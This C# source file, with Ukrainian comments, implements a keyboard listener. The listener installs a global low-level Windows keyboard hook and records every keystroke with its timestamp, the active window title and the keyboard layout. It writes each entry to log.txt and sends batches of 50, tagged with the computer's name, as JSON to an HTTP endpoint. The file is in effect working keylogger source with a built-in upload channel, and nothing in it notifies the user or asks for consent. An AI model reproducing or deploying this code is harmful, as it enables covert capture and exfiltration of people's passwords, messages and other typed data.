using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Last5Launching
{
    public class MyKeyboardListener
    {
        const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private IntPtr _hookPtr = IntPtr.Zero;
        private readonly KeyboardHookDelegate handler;

        private readonly List<string> _keyBuffer; // Буфер для клавіш
        private readonly object _bufferLock = new object(); // Об'єкт для синхронізації доступу до буфера
        private const int BufferLimit = 50; // Ліміт клавіш для відправки
        private const string ServerUrl = "http://localhost:5283/api/save-keypresses"; // URL для надсилання клавіш

        public MyKeyboardListener()
        {
            handler = KeyboardHandler;
            _keyBuffer = new List<string>();
        }

        delegate IntPtr KeyboardHookDelegate(int code, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int hookId, KeyboardHookDelegate del, IntPtr hmod, uint idThread);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr pHook);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr pHook, int code, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        public void SetHook()
        {
            _hookPtr = _setHook(handler);
        }

        public void UnsetHook()
        {
            UnhookWindowsHookEx(_hookPtr);
        }

        private IntPtr _setHook(KeyboardHookDelegate del)
        {
            var process = Process.GetCurrentProcess();
            var module = process.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, del, GetModuleHandle(module.ModuleName), 0);
        }

        private static string GetCurrentWindowTitle()
        {
            IntPtr handle = GetForegroundWindow();
            int length = GetWindowTextLength(handle);
            StringBuilder stringBuilder = new StringBuilder(length + 1);
            GetWindowText(handle, stringBuilder, stringBuilder.Capacity);
            return stringBuilder.ToString();
        }

        private static bool IsKeyPressed(int key)
        {
            short keyState = GetKeyState(key);
            return (keyState & 0x8000) != 0;
        }

        private static bool IsKeyToggled(int key)
        {
            short keyState = GetKeyState(key);
            return (keyState & 0x0001) != 0;
        }

        private void AddKeyPressToBuffer(string keyPressed)
        {
            lock (_bufferLock)
            {
                _keyBuffer.Add(keyPressed);

                if (_keyBuffer.Count >= BufferLimit)
                {
                    _ = SendKeyBufferToServerAsync(); // Асинхронно відправляємо буфер
                }
            }
        }

        private async Task SendKeyBufferToServerAsync()
        {
            lock (_bufferLock)
            {
                if (_keyBuffer.Count == 0)
                    return;
            }

            try
            {
                string computerName = Environment.MachineName;
                var payload = new
                {
                    computerName,
                    keyPresses = new List<string>()
                };

                lock (_bufferLock)
                {
                    payload.keyPresses.AddRange(_keyBuffer);
                    _keyBuffer.Clear(); // Очищення буфера
                }

                using var client = new HttpClient();
                var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
                var response = await client.PostAsync(ServerUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine($"Пакет із {payload.keyPresses.Count} клавіш успішно надіслано.");
                }
                else
                {
                    Console.WriteLine($"Помилка при відправці пакету клавіш: {response.ReasonPhrase}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Помилка при відправці пакету клавіш: {ex.Message}");
            }
        }

        private IntPtr KeyboardHandler(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                var keyCode = (Keys)Marshal.ReadInt32(lParam);
                bool shiftPressed = IsKeyPressed((int)Keys.ShiftKey);
                bool capsLockState = IsKeyToggled((int)Keys.CapsLock);

                string windowTitle = GetCurrentWindowTitle();
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string languageCode = GetCurrentLanguageCode();

                string logEntry = $"[{timestamp}] Window: '{windowTitle}' | Key: {keyCode} | " +
                                  $"Shift: {(shiftPressed ? "Pressed" : "Not Pressed")} | " +
                                  $"CapsLock: {(capsLockState ? "On" : "Off")} | " +
                                  $"Language: {languageCode}";

                // Логування у файл
                try
                {
                    File.AppendAllText("log.txt", logEntry + Environment.NewLine);
                }
                catch (IOException ex)
                {
                    Debug.WriteLine($"Error writing to log file: {ex.Message}");
                }

                AddKeyPressToBuffer(logEntry); // Додавання до буфера
            }

            return CallNextHookEx(_hookPtr, code, wParam, lParam);
        }

        private string GetCurrentLanguageCode()
        {
            var threadId = GetWindowThreadProcessId(GetForegroundWindow(), out _);
            var keyboardLayout = GetKeyboardLayout(threadId);
            int cultureId = keyboardLayout.ToInt32() & 0xFFFF;
            var cultureInfo = new CultureInfo(cultureId);
            return cultureInfo.TwoLetterISOLanguageName.ToUpper();
        }

        public void FlushBufferOnExit()
        {
            _ = SendKeyBufferToServerAsync(); // Відправка залишків буфера при завершенні роботи
        }
    }
}